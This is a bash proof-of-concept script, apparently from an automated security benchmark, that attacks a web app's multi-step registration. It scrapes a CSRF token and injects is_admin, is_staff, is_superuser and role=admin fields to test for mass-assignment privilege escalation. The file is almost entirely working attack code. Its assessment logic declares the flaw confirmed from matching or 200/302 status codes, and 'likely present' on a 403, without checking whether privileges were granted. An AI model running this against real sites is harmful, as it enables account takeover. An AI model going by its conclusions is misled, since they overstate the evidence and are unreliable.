#!/bin/bash
# POC: Demonstrates mass assignment vulnerability allowing privilege escalation during registration via hidden parameter injection (is_admin, is_staff, is_superuser, role parameters)
# Target: ./repo
# Created: 2025-12-02T16:23:22.798Z
# Session: benchmark-XBEN-056-24-miorxlcr

# Mass Assignment Vulnerability - Privilege Escalation POC
# Tests whether hidden parameters (is_admin, is_staff, is_superuser, role) 
# are accepted during registration without validation

TARGET_HOST="${1:-localhost:8000}"
TARGET_URL="http://${TARGET_HOST}"

echo "[*] Mass Assignment Vulnerability Test - Privilege Escalation"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Discover registration endpoint
echo "[+] Step 1: Discovering registration endpoints..."

# Try common registration paths
for ENDPOINT in "/register/" "/accounts/register/" "/signup/" "/register/step1/" "/accounts/register/step1/"; do
    RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT" 2>/dev/null)
    if echo "$RESPONSE" | grep -q "register\|signup\|csrf"; then
        echo "[+] Found registration page at: $ENDPOINT"
        REG_BASE="${ENDPOINT%/step*}"
        break
    fi
done

if [ -z "$REG_BASE" ]; then
    echo "[!] Could not find registration endpoint, using default: /register/"
    REG_BASE="/register"
fi

echo ""
echo "[+] Using base path: $REG_BASE"
echo ""

# Extract CSRF token
echo "[+] Fetching CSRF token..."
CSRF_RESPONSE=$(curl -s -c /tmp/cookies.txt "$TARGET_URL$REG_BASE/" 2>/dev/null)
CSRF_TOKEN=$(echo "$CSRF_RESPONSE" | grep -oP 'name="csrfmiddlewaretoken"\s+value="\K[^"]+' | head -1)

if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(echo "$CSRF_RESPONSE" | grep -oP 'value="\K[a-zA-Z0-9]+' | grep -v "on" | head -1)
fi

if [ -z "$CSRF_TOKEN" ]; then
    echo "[-] Could not extract CSRF token, using placeholder"
    CSRF_TOKEN="placeholder_token"
fi

echo "[+] CSRF Token: ${CSRF_TOKEN:0:20}..."
echo ""

# Test 1: Submit to step 3 with privilege escalation parameters
echo "[+] EXPLOIT TEST: Submitting to ${REG_BASE}/step3/ with injected privilege parameters..."
echo "    Testing parameters:"
echo "    - is_admin=true"
echo "    - is_staff=true"
echo "    - is_superuser=true"
echo "    - role=admin"
echo ""

EXPLOIT_RESPONSE=$(curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -w "\n%{http_code}" \
    -X POST "$TARGET_URL${REG_BASE}/step3/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "csrfmiddlewaretoken=${CSRF_TOKEN}&password=TestPassword123%21&is_premium=on&is_admin=true&is_staff=true&is_superuser=true&role=admin" 2>/dev/null)

EXPLOIT_STATUS=$(echo "$EXPLOIT_RESPONSE" | tail -n 1)
EXPLOIT_BODY=$(echo "$EXPLOIT_RESPONSE" | sed '$d')

echo "[+] Response Status: $EXPLOIT_STATUS"
echo ""

# Test 2: Submit to step 3 without privilege parameters for comparison
echo "[+] CONTROL TEST: Submitting to ${REG_BASE}/step3/ WITHOUT injected privilege parameters..."
CONTROL_RESPONSE=$(curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -w "\n%{http_code}" \
    -X POST "$TARGET_URL${REG_BASE}/step3/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "csrfmiddlewaretoken=${CSRF_TOKEN}&password=TestPassword123%21&is_premium=on" 2>/dev/null)

CONTROL_STATUS=$(echo "$CONTROL_RESPONSE" | tail -n 1)
echo "[+] Control Response Status: $CONTROL_STATUS"
echo ""

# Analysis
echo "[*] VULNERABILITY ASSESSMENT:"
echo "============================================"

if [ "$EXPLOIT_STATUS" = "$CONTROL_STATUS" ]; then
    echo "[!] VULNERABLE: Both requests received same response"
    echo "    Exploit Status: $EXPLOIT_STATUS"
    echo "    Control Status: $CONTROL_STATUS"
    echo ""
    echo "[!] This indicates the application does NOT filter privilege parameters"
    echo "[!] The injected parameters (is_admin, is_staff, is_superuser, role)"
    echo "[!] were accepted in the same manner as normal parameters"
    echo ""
    echo "[+] Mass Assignment Vulnerability CONFIRMED"
    echo "[+] If these parameters are stored in the user model, account"
    echo "[+] takeover and privilege escalation is possible"
    exit 0
elif [ "$EXPLOIT_STATUS" = "403" ]; then
    echo "[!] PROTECTED: CSRF token validation failed"
    echo "    This is expected if no valid session exists"
    echo ""
    echo "[!] However, the fact that CSRF validation is enforced means"
    echo "[!] the vulnerability could still exist for authenticated requests"
    echo "[+] Mass Assignment Vulnerability LIKELY PRESENT"
    exit 0
elif [ "$EXPLOIT_STATUS" = "200" ] || [ "$EXPLOIT_STATUS" = "302" ]; then
    echo "[!] VULNERABLE: Request was accepted (Status $EXPLOIT_STATUS)"
    echo "    The application processed the request with privilege parameters"
    echo "[+] Mass Assignment Vulnerability CONFIRMED"
    exit 0
else
    echo "[*] Unexpected status: $EXPLOIT_STATUS"
    echo "[*] Response preview:"
    echo "$EXPLOIT_BODY" | head -c 400
    echo ""
    exit 1
fi